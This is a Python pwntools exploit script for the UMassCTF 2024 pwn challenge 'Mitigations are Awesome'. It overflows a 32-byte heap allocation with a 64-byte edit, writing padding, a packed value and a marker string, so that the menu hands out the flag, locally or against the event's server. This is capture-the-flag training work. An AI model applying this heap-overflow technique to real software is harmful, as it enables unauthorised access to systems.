#!/usr/bin/env python3
from pwn import *
import sys, os

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-archive/UMassCTF 2024/pwn/Mitigations are Awesome/chall')
elf = ELF(TARGET)

def attach(r):
    if not REMOTE:
        bkps = ['*motivation+814']
        cmds = []

        gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
    return

def exploit(r):
    attach(r)

    # make allocation
    r.sendlineafter(b'take?\n', b'1')
    r.sendlineafter(b'be?\n', b'32')

    # edit allocation
    r.sendlineafter(b'take?\n', b'3')
    r.sendlineafter(b'edit?\n', b'0')
    r.sendlineafter(b'buffer?\n', b'64')
    r.sendlineafter(b'bounds!\n', cyclic(0x28) + p64(0x20000) + b'Ez W\0')

    # retrieve flag
    r.sendlineafter(b'take?\n', b'4')
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('mitigations-are-awesome.ctf.umasscybersec.org', 1337)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
